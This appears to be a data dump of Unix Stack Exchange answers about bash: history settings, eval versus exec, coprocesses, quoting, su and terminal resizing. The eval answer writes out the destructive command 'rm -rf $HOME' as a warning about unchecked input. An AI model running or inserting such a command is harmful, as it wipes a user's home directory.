<li>Because they are loaded via /etc/profile which makes them a part of the bash ""profile"" in the same way anyway.</li>
</ol>

<blockquote>
  <p><strong>If these files are application-specific startup files not critical to Bash startup, then why are they part of the startup process ? Why
  are they not run only when the specific applications, for which they
  contain settings, are executed ?</strong></p>
</blockquote>

<p>That seems to me like a broader design philosophy question that I'll split into two.  The first question is about the value and appropriateness of using the shell environment.  Does it have positive value?  Yes, it is useful.  Is it the best solution to all configuration issues?  No, but it is very efficient for managing simple parameters, and also widely recognized and understood. Contrast that to say, deciding to configure such things heterogeneously, perhaps $PATH could be managed by a separate independent tool, preferred tools such as $EDITOR could be in an sqlite file somewhere, $LC lang stuff could be in a text file with a custom format somewhere else, etc -- doesn't just using env variables and <code>/etc/profile.d</code> suddenly seem simpler?  You probably already know what an env variable is, how they work and how to use them, vs. learning 5 completely different mechanisms for 5 different ubiquitous aspects of what is <em>appropriately named</em> ""the environment"".</p>

<p>The second question is, ""Is startup the appropriate time for this?"", which begs the objection that it is not very efficient (all that data which may or may not get used, etc). But:  </p>

<ul>
<li>Realistically, it is not all that much data, partially because no one in their right mind would use it for more than a few simple parameters (since there are other means of configuring an application).</li>
<li>If it is used wisely, with regard to things that are commonly invoked, then setting, eg, default $CFLAGS from a file somewhere every time you invoke <code>gcc</code> would be less efficient.  Keep in mind that the amount of memory involved is, again, infinitesimal.  </li>
<li>It can involve systemic things which more than one application may be involved with, and the shell is a <em>common ground</em>.</li>
</ul>

<p>More could be added to that list, but hopefully this gives you some idea about the pros and cons of the issue -- the major 'pro' and the major 'con' being that it is a global namespace.</p>
"
"Command-line completion from command history","5366","<bash><command-history><autocomplete>","97","<p>Pressing <kbd>Ctrl</kbd>+<kbd>R</kbd> will open the reverse history search. Now start typing your command, this will give the first match.
By pressing <kbd>Ctrl</kbd>+<kbd>R</kbd> again (and again) you can cycle through the history.</p>

<pre><code>mysq(Ctrl+R)
</code></pre>

<p>Would give:</p>

<pre><code>mysqldump  --add-drop-table -e -q -n -C -u 
</code></pre>

<p><kbd>Ctrl</kbd>+<kbd>R</kbd> again:</p>

<pre><code>mysql -u ben.dauphinee -p
</code></pre>
"
"Bash history: ""ignoredups"" and ""erasedups"" setting conflict with common history across sessions","18212","<bash><command-history>","97","<p>This is actually a really interesting behavior and I confess I have greatly underestimated the question at the beginning.  But first the facts:</p>
<p>###1. What works</p>
<p>The functionality can be achieved in several ways, though each works a bit differently. Note that, in each case, to have the history &quot;transferred&quot; to another terminal (updated), one has to press <kbd>Enter</kbd> in the terminal, where he/she wants to retrieve the history.</p>
<ul>
<li><p>option 1:</p>
<pre><code> shopt -s histappend
 HISTCONTROL=ignoredups
 PROMPT_COMMAND=&quot;history -a; history -n; $PROMPT_COMMAND&quot;
</code></pre>
</li>
</ul>
<p>This has two drawbacks:</p>
<ol>
<li>At login (opening a terminal), the last command from the history file is read twice into the current terminal's history buffer;</li>
<li>The buffers of different terminals do not stay in sync with the history file.</li>
</ol>
<ul>
<li><p>option 2:</p>
<pre><code> HISTCONTROL=ignoredups
 PROMPT_COMMAND=&quot;history -a; history -c; history -r; $PROMPT_COMMAND&quot;
</code></pre>
</li>
</ul>
<p>(Yes, no need for <code>shopt -s histappend</code> and yes, it <em>has to be</em> <code>history -c</code> in the middle of <code>PROMPT_COMMAND</code>)
This version has  also two important drawbacks:</p>
<ol>
<li>The history file has to be initialized. It has to contain <em>at least one non-empty line</em> (can be anything).</li>
<li>The <code>history</code> command can give false output - see below.</li>
</ol>
<p><strong>[Edit]</strong>
<em>&quot;And the winner is...&quot;</em></p>
<ul>
<li><p><strong>option 3:</strong></p>
<pre><code> HISTCONTROL=ignoredups:erasedups
 shopt -s histappend
 PROMPT_COMMAND=&quot;history -n; history -w; history -c; history -r; $PROMPT_COMMAND&quot;
</code></pre>
</li>
</ul>
<p>This is as far as it gets. It is the <em>only</em> option to have both <code>erasedups</code> and common history working simultaneously.
<strong>This</strong> is probably the <em>final solution</em> to all your problems, Aahan.</p>
<hr />
<p>###2. Why does <em>option 2</em> not seem to work (or: <em>what really</em> doesn't work as expected)?
As I mentioned, each of the above solutions works differently. But <strong>the most misleading interpretation of how the settings work comes from analysing the output of <code>history</code> command</strong>.  In many cases, the command can give <strong>false</strong> output. Why? Because <strong>it is executed <em>before</em> the sequence of other <code>history</code> commands contained in the <code>PROMPT_COMMAND</code>!</strong> However, when using the second or third option, one can monitor the changes of <code>.bash_history</code> contents  (using <code>watch -n1 &quot;tail -n20 .bash_history&quot;</code> for example) and see what the real history is.</p>
<p>###3. Why <em>option 3</em> is so complicated?
It all lies in the way <code>erasedups</code> works. As the bash manual states,  <em>&quot;(...) <code>erasedups</code> causes all previous lines matching the current line to be removed from  the history list before that line is saved&quot;</em>. So this is really what the OP wanted <em>(and not just, as I previously thought, to have no duplicates appearing <strong>in sequence</strong>)</em>. Here's why each of the <code>history -.</code> commands either has to or can not be in the <code>PROMPT_COMMAND</code>:</p>
<ul>
<li><p><code>history -n</code>  <strong>has</strong> to be there before <code>history -w</code> to read from <code>.bash_history</code> the commands saved from any other terminal,</p>
</li>
<li><p><code>history -w</code> <strong>has</strong> to be there in order to save the new history to the file after bash has checked if the command was a duplicate,</p>
</li>
<li><p><code>history -a</code> <strong>must not</strong> be placed there instead of <code>history -w</code>, because it will add to the file any new command, regardless of whether it was checked as a duplicate.</p>
</li>
<li><p><code>history -c</code> is also <strong>needed</strong> because it prevents trashing the history buffer after each command,</p>
</li>
<li><p>and finally, <code>history -r</code> is <strong>needed</strong> to restore the history buffer from file, thus finally making the history shared across terminal sessions.</p>
</li>
</ul>
<p>Be aware that this solution will mess up the history order by putting all history from other terminals in front of the newest command entered in the current terminal. It also does not delete duplicate lines already in the history file unless you enter that command again.</p>
"
"What's the difference between eval and exec?","296838","<bash><shell><shell-builtin>","96","<p><code>eval</code> and <code>exec</code> are completely different beasts. (Apart from the fact that both will run commands, but so does everything you do in a shell.)</p>

<pre><code>$ help exec
exec: exec [-cl] [-a name] [command [arguments ...]] [redirection ...]
    Replace the shell with the given command.
</code></pre>

<p>What <code>exec cmd</code> does, is exactly the same as just running <code>cmd</code>, except that the current shell is replaced with the command, instead of a separate process being run. Internally, running say <code>/bin/ls</code> will call <code>fork()</code> to create a child process, and then <code>exec()</code> in the child to execute <code>/bin/ls</code>. <code>exec /bin/ls</code> on the other hand will <em>not</em> fork, but just replaces the shell.</p>

<p>Compare:</p>

<pre><code>$ bash -c 'echo $$ ; ls -l /proc/self ; echo foo'
7218
lrwxrwxrwx 1 root root 0 Jun 30 16:49 /proc/self -&gt; 7219
foo
</code></pre>

<p>with</p>

<pre><code>$ bash -c 'echo $$ ; exec ls -l /proc/self ; echo foo'
7217
lrwxrwxrwx 1 root root 0 Jun 30 16:49 /proc/self -&gt; 7217
</code></pre>

<p><code>echo $$</code> prints the PID of the shell I started, and listing <code>/proc/self</code> gives us the PID of the <code>ls</code> that was ran from the shell. Usually, the process IDs are different, but with <code>exec</code> the shell and <code>ls</code> have the same process ID. Also, the command following <code>exec</code> didn't run, since the shell was replaced.</p>

<hr>

<p>On the other hand:</p>

<pre><code>$ help eval
eval: eval [arg ...]
    Execute arguments as a shell command.
</code></pre>

<p><code>eval</code> will run the arguments as a command in the current shell.  In other words <code>eval foo bar</code> is the same as just <code>foo bar</code>. But variables will be expanded before executing, so we can execute commands saved in shell variables:</p>

<pre><code>$ unset bar
$ cmd=""bar=foo""
$ eval ""$cmd""
$ echo ""$bar""
foo
</code></pre>

<p>It will <em>not</em> create a child process, so the variable is set in the current shell. (Of course <code>eval /bin/ls</code> will create a child process, the same way a plain old <code>/bin/ls</code> would.)</p>

<p>Or we could have a command that outputs shell commands. Running <code>ssh-agent</code> starts the agent in the background, and outputs a bunch of variable assignments, which could be set in the current shell and used by child processes (the <code>ssh</code> commands you would run). Hence <code>ssh-agent</code> can be started with:</p>

<pre><code>eval $(ssh-agent)
</code></pre>

<p>And the current shell will get the variables for other commands to inherit.</p>

<hr>

<p>Of course, if the variable <code>cmd</code> happened to contain something like <code>rm -rf $HOME</code>, then running <code>eval ""$cmd""</code> would not be something you'd want to do. Even things like command substitutions inside the string would be processed, so <em>one should <strong>really</strong> be sure that the input to <code>eval</code> is safe before using it.</em></p>

<p>Often, it's possible to avoid <code>eval</code> and avoid even accidentally mixing code and data in the wrong way.</p>
"
"Multiline shell script comments - how does this work?","37411","<bash><shell-script>","96","<p>That is not a multi-line comment.  <code>#</code> is a single line comment. 
<a href=""http://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html#colon""><code>:</code> (colon)</a> is not a comment at all, but rather a shell built-in command that is basically a <a href=""http://en.wikipedia.org/wiki/Nop"">NOP</a>, a null operation that does nothing except return true, like <code>true</code> (and thus setting <code>$?</code> to 0 as a side effect).  However since it is a command, it can accept arguments, and since it ignores its arguments, in most cases it superficially acts like a comment.  The main problem with this kludge is the arguments are still expanded, leading to a host of unintended consequences.  The arguments are still affected by syntax errors, redirections are still performed so <code>: &gt; file</code> will truncate <code>file</code>, and <code>: $(dangerous command)</code> substitutions will still run.</p>

<p>The least surprising completely safe way to insert comments in shell scripts is with <code>#</code>.  Stick to that even for multi-line comments.  <em>Never</em> attempt to (ab)use <code>:</code> for comments.  There is no dedicated multi-line comment mechanism in shell that is analogous to the slash-star <code>/* */</code> form in <code>C</code>-like languages.</p>

<hr>

<p>For the sake of completeness, but not because it is recommended practice, I will mention that it is possible to use <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html#tag_18_07_04"">here-documents</a> to do multi-line ""comments"":</p>

<pre><code>: &lt;&lt;'end_long_comment'
This is an abuse of the null command ':' and the here-document syntax
to achieve a ""multi-line comment"".  According to the POSIX spec linked 
above, if any character in the delimiter word (""end_long_comment"" in 
this case) above is quoted, the here-document will not be expanded in 
any way.  This is **critical**, as failing to quote the ""end_long_comment"" 
will result in the problems with unintended expansions described above. 
All of this text in this here-doc goes to the standard input of :, which 
does nothing with it, hence the effect is like a comment.  There is very 
little point to doing this besides throwing people off.  Just use '#'.
end_long_comment
</code></pre>
"
"What does it mean to have a $""dollarsign-prefixed string"" in a script?","48106","<bash><shell-script><scripting><quoting>","95","<p>There are two different things going on here, both documented in the <code>bash</code> manual</p>
<h1>$'</h1>
<p>Dollar-sign single quote is a special form of quoting:</p>
<p><a href=""http://www.gnu.org/software/bash/manual/html_node/ANSI_002dC-Quoting.html"" rel=""noreferrer"">ANSI C Quoting</a></p>
<blockquote>
<p>Words of the form $'string' are treated specially. The word expands to string, with backslash-escaped characters replaced as specified by the ANSI C standard.</p>
</blockquote>
<h1>$&quot;</h1>
<p>Dollar-sign double-quote is for localization:</p>
<p><a href=""http://www.gnu.org/software/bash/manual/html_node/Locale-Translation.html"" rel=""noreferrer"">Locale translation</a></p>
<blockquote>
<p>A double-quoted string preceded by a dollar sign (‘$’) will cause the string to be translated according to the current locale. If the current locale is C or POSIX, the dollar sign is ignored. If the string is translated and replaced, the replacement is double-quoted.</p>
</blockquote>
"
"How to solve the issue that a Terminal screen is messed up? (usually after a resizing)","61584","<bash><terminal>","94","<p>If you are using bash, check if ""checkwinsize"" option is activated in your session using</p>

<pre><code>shopt | grep checkwinsize
</code></pre>

<p>If you don't get </p>

<pre><code>checkwinsize    on
</code></pre>

<p>then activate it with</p>

<pre><code>shopt -s checkwinsize
</code></pre>

<p>Bash documentation says for ""checkwinsize"" attribute : </p>

<blockquote>
  <p>""If set, Bash checks the window size after each command and, if
  necessary, updates the values of LINES and COLUMNS.""</p>
</blockquote>

<p>If you like the setting, you could activate <code>checkwinsize</code> in your <code>~/.bashrc</code>.</p>

<ul>
<li>To activate: <code>shopt -s checkwinsize</code></li>
<li>To deactivate: <code>shopt -u checkwinsize</code></li>
</ul>
"
"su options - running command as another user","1087","<bash><scripting><su><sudo>","94","<p>Yes. Here's the <code>--help</code>:</p>

<pre><code>$ su --help
Usage: su [options] [LOGIN]

Options:
  -c, --command COMMAND         pass COMMAND to the invoked shell
  -h, --help                    display this help message and exit
  -, -l, --login                make the shell a login shell
  -m, -p,
  --preserve-environment        do not reset environment variables, and
                                keep the same shell
  -s, --shell SHELL             use SHELL instead of the default in passwd
</code></pre>

<p>And some testing (I used <code>sudo</code> as I don't know the password for the <code>nobody</code> account)</p>

<pre><code>$ sudo su -c whoami nobody
[sudo] password for oli: 
nobody
</code></pre>

<p>When your command takes arguments you need to quote it. If you don't, strange things will occur. Here I am —as root— trying to create a directory in /home/oli (as oli) <em>without</em> quoting the full command:</p>

<pre><code># su -c mkdir /home/oli/java oli
No passwd entry for user '/home/oli/java'
</code></pre>

<p>It's only read <code>mkdir</code> as the value for the <code>-c</code> flag and it's trying to use <code>/home/oli/java</code> as the username. If we quote it, it just works:</p>

<pre><code># su -c ""mkdir /home/oli/java"" oli
# stat /home/oli/java
  File: ‘/home/oli/java’
  Size: 4096        Blocks: 8          IO Block: 4096   directory
Device: 811h/2065d  Inode: 5817025     Links: 2
Access: (0775/drwxrwxr-x)  Uid: ( 1000/     oli)   Gid: ( 1000/     oli)
Access: 2016-02-16 10:49:15.467375905 +0000
Modify: 2016-02-16 10:49:15.467375905 +0000
Change: 2016-02-16 10:49:15.467375905 +0000
 Birth: -
</code></pre>
"
"Press space to continue","134437","<bash><control-flow>","94","<p>You can use <code>read</code>:</p>
<pre><code>read -n1 -s -r -p $'Press space to continue...\n' key

if [ &quot;$key&quot; = ' ' ]; then
    # Space pressed, do something
    # echo [$key] is empty when SPACE is pressed # uncomment to trace
else
    # Anything else pressed, do whatever else.
    # echo [$key] not empty
fi
</code></pre>
<p>Replace <code>' '</code> for space at above with <code>''</code> for Enter key, <code>$'\t'</code> for Tab key.</p>
"
"How to use watch command with a piped chain of commands/programs","318859","<bash><pipe><watch>","90","<pre><code>watch 'command | othertool | yet-another-tool'
</code></pre>
"
"How do you use the command coproc in various shells?","86270","<bash><shell><zsh><ksh><coprocesses>","90","

<p>co-processes are a <code>ksh</code> feature (already in <code>ksh88</code>). <code>zsh</code> has had the feature from the start (early 90s), while it has just only been added to <code>bash</code> in <code>4.0</code> (2009).</p>

<p>However, the behaviour and interface is significantly different between the 3 shells.</p>

<p>The idea is the same, though: it allows to start a job in background and being able to send it input and read its output without having to resort to  named pipes.</p>

<p>That is done with unnamed pipes with most shells and socketpairs with recent versions of ksh93 on some systems. </p>

<p>In <code>a | cmd | b</code>, <code>a</code> feeds data to <code>cmd</code> and <code>b</code> reads its output. Running <code>cmd</code> as a co-process allows the shell to be both <code>a</code> and <code>b</code>.</p>

<h2>ksh co-processes</h2>

<p>In <code>ksh</code>, you start a coprocess as:</p>

<pre class=""lang-bash prettyprint-override""><code>cmd |&amp;
</code></pre>

<p>You feed data to <code>cmd</code> by doing things like:</p>

<pre class=""lang-bash prettyprint-override""><code>echo test &gt;&amp;p
</code></pre>

<p>or</p>

<pre class=""lang-bash prettyprint-override""><code>print -p test
</code></pre>

<p>And read <code>cmd</code>'s output with things like:</p>

<pre class=""lang-bash prettyprint-override""><code>read var &lt;&amp;p
</code></pre>

<p>or</p>

<pre class=""lang-bash prettyprint-override""><code>read -p var
</code></pre>

<p><code>cmd</code> is started as any background job, You can use <code>fg</code>, <code>bg</code>, <code>kill</code> on it and refer it by <code>%job-number</code> or via <code>$!</code>.</p>

<p>To close the writing end of the pipe <code>cmd</code> is reading from, you can do:</p>

<pre class=""lang-bash prettyprint-override""><code>exec 3&gt;&amp;p 3&gt;&amp;-
</code></pre>

<p>And to close the reading end of the other pipe (the one <code>cmd</code> is writing to):</p>

<pre class=""lang-bash prettyprint-override""><code>exec 3&lt;&amp;p 3&lt;&amp;-
</code></pre>

<p>You cannot start a second co-process unless you first save the pipe file descriptors to some other fds. For instance:</p>

<pre class=""lang-bash prettyprint-override""><code>tr a b |&amp;
exec 3&gt;&amp;p 4&lt;&amp;p
tr b c |&amp;
echo aaa &gt;&amp;3
echo bbb &gt;&amp;p
</code></pre>

<h2>zsh co-processes</h2>

<p>In <code>zsh</code>, co-processes are nearly identical to those in <code>ksh</code>. The only real difference is that <code>zsh</code> co-processes are started with the <code>coproc</code> keyword.</p>

<pre class=""lang-bash prettyprint-override""><code>coproc cmd
echo test &gt;&amp;p
read var &lt;&amp;p
print -p test
read -p var
</code></pre>

<p>Doing:</p>

<pre class=""lang-bash prettyprint-override""><code>exec 3&gt;&amp;p
</code></pre>

<p>Note: This doesn't move the <code>coproc</code> file descriptor to fd <code>3</code> (like in <code>ksh</code>), but duplicates it. So, there's no explicit way to close the feeding or reading pipe, other starting <em>another</em> <code>coproc</code>. </p>

<p>For instance, to close the feeding end:</p>

<pre class=""lang-bash prettyprint-override""><code>coproc tr a b
echo aaaa &gt;&amp;p # send some data

exec 4&lt;&amp;p     # preserve the reading end on fd 4
coproc :      # start a new short-lived coproc (runs the null command)

cat &lt;&amp;4       # read the output of the first coproc
</code></pre>

<p>In addition to pipe based co-processes, <code>zsh</code> (since 3.1.6-dev19, released in 2000) has pseudo-tty based constructs like <code>expect</code>. To interact with most programs, ksh-style co-processes won't work, since programs start buffering when their output is a pipe.</p>

<p>Here are some examples.</p>

<p><strong>Start the co-process <code>x</code>:</strong></p>

<pre class=""lang-bash prettyprint-override""><code>zmodload zsh/zpty
zpty x cmd
</code></pre>

<p>(Here, <code>cmd</code> is a simple command. But you can do fancier things with <code>eval</code> or functions.)</p>

<p><strong>Feed a co-process data:</strong></p>

<pre class=""lang-bash prettyprint-override""><code>zpty -w x some data
</code></pre>

<p><strong>Read co-process data (in the simplest case):</strong></p>

<pre class=""lang-bash prettyprint-override""><code>zpty -r x var
</code></pre>

<p>Like <code>expect</code>, it can wait for some output from the co-process matching a given pattern.</p>

<h2>bash co-processes</h2>

<p>The bash syntax is a lot newer, and builds on top of a new feature recently added to ksh93, bash, and zsh. It provides a syntax to allow handling of dynamically-allocated file descriptors above 10.</p>

<p><code>bash</code> offers a <strong>basic</strong> <code>coproc</code> syntax, and an <strong>extended</strong> one. </p>

<h3>Basic syntax</h3>

<p><strong>The basic syntax for starting a co-process looks like <code>zsh</code>'s:</strong></p>

<pre class=""lang-bash prettyprint-override""><code>coproc cmd
</code></pre>

<p>In <code>ksh</code> or <code>zsh</code>, the pipes to and from the co-process are accessed with <code>&gt;&amp;p</code> and <code>&lt;&amp;p</code>. </p>

<p>But in <code>bash</code>, the file descriptors of the pipe from the co-process and the other pipe to the co-proccess are returned in the <code>$COPROC</code> array (respectively <code>${COPROC[0]}</code> and <code>${COPROC[1]}</code>. So…</p>

<p><strong>Feed data to the co-process:</strong></p>

<pre class=""lang-bash prettyprint-override""><code>echo xxx &gt;&amp;""${COPROC[1]}""
</code></pre>

<p><strong>Read data from the co-process:</strong></p>

<pre class=""lang-bash prettyprint-override""><code>read var &lt;&amp;""${COPROC[0]}""
</code></pre>

<p>With the basic syntax, you can start only one co-process at the time.</p>

<h3>Extended syntax</h3>

<p>In the extended syntax, you can <em>name</em> your co-processes (like in <code>zsh</code> zpty co-proccesses):</p>

<pre class=""lang-bash prettyprint-override""><code>coproc mycoproc { cmd; }
</code></pre>

<p>The command <em>has</em> to be a compound command. (Notice how the example above is reminiscent of <code>function f { ...; }</code>.)</p>

<p>This time, the file descriptors are in <code>${mycoproc[0]}</code> and <code>${mycoproc[1]}</code>.</p>

<p>You can start more than one co-process at a time—but you <em>do</em> get a warning when you start a co-process while one is still running (even in non-interactive mode).</p>

<p>You can close the file descriptors when using the extended syntax.</p>

<pre class=""lang-bash prettyprint-override""><code>coproc tr { tr a b; }
echo aaa &gt;&amp;""${tr[1]}""

exec {tr[1]}&gt;&amp;-

cat &lt;&amp;""${tr[0]}""
</code></pre>

<p>Note that closing that way doesn't work in bash versions prior to 4.3 where you have to write it instead:</p>

<pre class=""lang-bash prettyprint-override""><code>fd=${tr[1]}
exec {fd}&gt;&amp;-
</code></pre>

<p>As in <code>ksh</code> and <code>zsh</code>, those pipe file descriptors are marked as close-on-exec. </p>

<p>But in <code>bash</code>, the only way to pass those to executed commands is to duplicate them to fds <code>0</code>, <code>1</code>, or <code>2</code>. That limits the number of co-processes you can interact with for a single command. (See below for an example.)</p>

<h2>yash process and pipeline redirection</h2>

<p><a href=""http://yash.osdn.jp/doc/"" rel=""noreferrer""><code>yash</code></a> doesn't have a co-process feature per se, but the same concept can be implemented with its <em>pipeline</em> and <em>process</em> redirection features. <code>yash</code> has an interface to the <code>pipe()</code> system call, so this kind of thing can be done relatively easily by hand there.</p>

<p>You'd start a co-process with:</p>

<pre class=""lang-bash prettyprint-override""><code>exec 5&gt;&gt;|4 3&gt;(cmd &gt;&amp;5 4&lt;&amp;- 5&gt;&amp;-) 5&gt;&amp;-
</code></pre>

<p>Which first creates a <code>pipe(4,5)</code> (5 the writing end, 4 the reading end), then redirects fd 3 to a pipe to a process that runs with its stdin at the other end, and stdout going to the pipe created earlier. Then we close the writing end of that pipe in the parent which we won't need. So now in the shell we have fd 3 connected to the cmd's stdin and fd 4 connected to cmd's stdout with pipes.</p>

<p>Note that the close-on-exec flag is not set on those file descriptors.</p>

<p>To feed data:</p>

<pre class=""lang-bash prettyprint-override""><code>echo data &gt;&amp;3 4&lt;&amp;-
</code></pre>

<p>To read data:</p>

<pre class=""lang-bash prettyprint-override""><code>read var &lt;&amp;4 3&gt;&amp;-
</code></pre>

<p>And you can close fds as usual:</p>

<pre class=""lang-bash prettyprint-override""><code>exec 3&gt;&amp;- 4&lt;&amp;-
</code></pre>

<hr>

<h2>Now, why they are not so popular</h2>

<h3>hardly any benefit over using named pipes</h3>

<p>Co-processes can easily be implemented with standard named pipes. I don't know when exactly named pipes were introduced but it's possible it was after <code>ksh</code> came up with co-processes (probably in the mid 80s, ksh88 was ""released"" in 88, but I believe <code>ksh</code> was used internally at AT&amp;T a few years before that) which would explain why.</p>

<pre class=""lang-bash prettyprint-override""><code>cmd |&amp;
echo data &gt;&amp;p
read var &lt;&amp;p
</code></pre>

<p>Can be written with:</p>

<pre class=""lang-bash prettyprint-override""><code>mkfifo in out

cmd &lt;in &gt;out &amp;
exec 3&gt; in 4&lt; out
echo data &gt;&amp;3
read var &lt;&amp;4
</code></pre>

<p>Interacting with those is more straightforward—especially if you need to run more than one co-process. (See examples below.)</p>

<p>The only benefit of using <code>coproc</code> is that you don't have to clean up of those named pipes after use.</p>

<h3>deadlock-prone</h3>

<p>Shells use pipes in a few constructs: </p>

<ul>
<li><strong>shell pipes:</strong> <code>cmd1 | cmd2</code>,</li>
<li><strong>command substitution:</strong> <code>$(cmd)</code>,</li>
<li>and <strong>process substitution:</strong> <code>&lt;(cmd)</code>, <code>&gt;(cmd)</code>.</li>
</ul>

<p>In those, the data flows in <strong>only one</strong> direction between different processes.</p>

<p>With co-processes and named pipes, though, it's easy to run into deadlock. You have to keep track of which command has which file descriptor open, to prevent one staying open and holding a process alive. Deadlocks can be tricky to investigate, because they may occur non-deterministically; for instance, only when as much data as to fill one pipe up is sent.</p>

<h3>works worse than <code>expect</code> for what it's been designed for</h3>

<p>The main purpose of co-processes was to provide the shell with a way to interact with commands. However, it does not work so well.</p>

<p>The simplest form of deadlock mentioned above is:</p>

<pre class=""lang-bash prettyprint-override""><code>tr a b |&amp;
echo a &gt;&amp;p
read var&lt;&amp;p
</code></pre>

<p>Because its output doesn't go to a terminal, <code>tr</code> buffers its output. So it won't output anything until either it sees end-of-file on its <code>stdin</code>, or it has accumulated a buffer-full of data to output. So above, after the shell has output  <code>a\n</code> (only 2 bytes), the <code>read</code> will block indefinitely because <code>tr</code> is waiting for the shell to send it more data.</p>

<p>In short, pipes aren't good for interacting with commands. Co-processes can only be used to interact with commands that don't buffer their output, <em>or</em> commands which can be told not to buffer their output; for example, by using <code>stdbuf</code> with some commands on recent GNU or FreeBSD systems.</p>

<p>That's why <code>expect</code> or <code>zpty</code> use pseudo-terminals instead. <code>expect</code> is a tool designed for interacting with commands, and it does it well.</p>

<h3>File descriptor handling is fiddly, and hard to get right</h3>

<p>Co-processes can be used to do some more complex plumbing than what simple shell pipes allow.</p>

<p><a href=""https://unix.stackexchange.com/a/66875/22565"">that other Unix.SE answer</a> has an example of a coproc usage.</p>

<p><strong>Here's a simplified example:</strong> Imagine you want a function that feeds a copy of a command's output to 3 other commands, and then have the output of those 3 commands get concatenated. </p>

<p>All using pipes.</p>

<p>For instance: feed the output of <code>printf '%s\n' foo bar</code> to <code>tr a b</code>, <code>sed 's/./&amp;&amp;/g'</code>, and <code>cut -b2-</code> to obtain something like:</p>

<pre class=""lang-bash prettyprint-override""><code>foo
bbr
ffoooo
bbaarr
oo
ar
</code></pre>

<p>First, it's not necessarily obvious, but there’s a possibility for deadlock there, and it will start to happen after only a few kilobytes of data.</p>

<p>Then, depending on your shell, you’ll run in a number of different problems that have to be addressed differently.</p>

<p>For instance, with <code>zsh</code>, you'd do it with:</p>

<pre class=""lang-bash prettyprint-override""><code>f() (
  coproc tr a b
  exec {o1}&lt;&amp;p {i1}&gt;&amp;p
  coproc sed 's/./&amp;&amp;/g' {i1}&gt;&amp;- {o1}&lt;&amp;-
  exec {o2}&lt;&amp;p {i2}&gt;&amp;p
  coproc cut -c2- {i1}&gt;&amp;- {o1}&lt;&amp;- {i2}&gt;&amp;- {o2}&lt;&amp;-
  tee /dev/fd/$i1 /dev/fd/$i2 &gt;&amp;p {o1}&lt;&amp;- {o2}&lt;&amp;- &amp;
  exec cat /dev/fd/$o1 /dev/fd/$o2 - &lt;&amp;p {i1}&gt;&amp;- {i2}&gt;&amp;-
)
printf '%s\n' foo bar | f
</code></pre>

<p>Above, the co-process fds have the close-on-exec flag set, but <em>not</em> the ones that are duplicated from them (as in <code>{o1}&lt;&amp;p</code>). So, to avoid deadlocks, you’ll have to make sure they're closed in any processes that don't need them. </p>

<p>Similarly, we have to use a subshell and use <code>exec cat</code> in the end, to ensure there's no shell process lying about holding a pipe open.</p>

<p>With <code>ksh</code> (here <code>ksh93</code>), that would have to be:</p>

<pre class=""lang-bash prettyprint-override""><code>f() (
  tr a b |&amp;
  exec {o1}&lt;&amp;p {i1}&gt;&amp;p
  sed 's/./&amp;&amp;/g' |&amp;
  exec {o2}&lt;&amp;p {i2}&gt;&amp;p
  cut -c2- |&amp;
  exec {o3}&lt;&amp;p {i3}&gt;&amp;p
  eval 'tee ""/dev/fd/$i1"" ""/dev/fd/$i2""' &gt;&amp;""$i3"" {i1}&gt;&amp;""$i1"" {i2}&gt;&amp;""$i2"" &amp;
  eval 'exec cat ""/dev/fd/$o1"" ""/dev/fd/$o2"" -' &lt;&amp;""$o3"" {o1}&lt;&amp;""$o1"" {o2}&lt;&amp;""$o2""
)
printf '%s\n' foo bar | f
</code></pre>

<p>(<strong>Note:</strong> That won’t work on systems where <code>ksh</code> uses <code>socketpairs</code> instead of <code>pipes</code>, and where <code>/dev/fd/n</code> works like on Linux.)</p>

<p>In <code>ksh</code>, fds above <code>2</code> are marked with the close-on-exec flag, unless they’re passed explicitly on the command line. That’s why we don't have to close the unused file descriptors like with <code>zsh</code>—but it’s also why we have to do <code>{i1}&gt;&amp;$i1</code> and use <code>eval</code> for that new value of <code>$i1</code>, to be passed to <code>tee</code> and <code>cat</code>…</p>

<p>In <code>bash</code> this cannot be done, because you can't avoid the close-on-exec flag.</p>

<p>Above, it's relatively simple, because we use only simple external commands. It gets more complicated when you want to use shell constructs in there instead, and you start running into shell bugs.</p>

<p>Compare the above with the same using named pipes:</p>

<pre class=""lang-bash prettyprint-override""><code>f() {
  mkfifo p{i,o}{1,2,3}
  tr a b &lt; pi1 &gt; po1 &amp;
  sed 's/./&amp;&amp;/g' &lt; pi2 &gt; po2 &amp;
  cut -c2- &lt; pi3 &gt; po3 &amp;

  tee pi{1,2} &gt; pi3 &amp;
  cat po{1,2,3}
  rm -f p{i,o}{1,2,3}
}
printf '%s\n' foo bar | f
</code></pre>

<h2>Conclusion</h2>

<p>If you want to interact with a command, use <code>expect</code>, or <code>zsh</code>'s <code>zpty</code>, or named pipes.</p>

<p>If you want to do some fancy plumbing with pipes, use named pipes.</p>

<p>Co-processes can do some of the above, but be prepared to do some serious head scratching for anything non-trivial.</p>
"
"How to add newlines into variables in bash script","20035","<bash><quoting>","90","<p>In <code>bash</code> you can use the syntax</p>

<pre><code>str=$'Hello World\n===========\n'
</code></pre>

<p>Single quotes preceded by a <code>$</code> is a new syntax that allows to insert escape sequences in strings.</p>

<p>Also <code>printf</code> builtin allows to save the resulting output to a variable</p>

<pre><code>printf -v str 'Hello World\n===========\n'
</code></pre>

<p>Both solutions do not require a subshell.</p>

<p>If in the following you need to print the string, you should use double quotes, like in the following example:</p>

<pre><code>echo ""$str""
</code></pre>

<p>because when you print the string without quotes, newline are converted to spaces.</p>
"
"How to do nothing forever in an elegant way?","42901","<bash><shell-script><stdout><background-process><stdin>","90","<p>In shells that support them (ksh, zsh, bash4), you can start <code>program</code> as a <a href=""https://unix.stackexchange.com/a/86372/22565"">co-process</a>.</p>

<ul>
<li><code>ksh</code>: <code>program &gt; output |&amp;</code></li>
<li><code>zsh</code>, <code>bash</code>: <code>coproc program &gt; output</code></li>
</ul>

<p>That starts <code>program</code> in background with its input redirected from a <code>pipe</code>. The other end of the pipe is open to the shell.</p>

<p>Three benefits of that approach</p>

<ul>
<li>no extra process</li>
<li>you can exit the script when <code>program</code> dies (use <code>wait</code> to wait for it)</li>
<li><code>program</code> will terminate (get <code>eof</code> on its stdin if the shell exits).</li>
</ul>
"
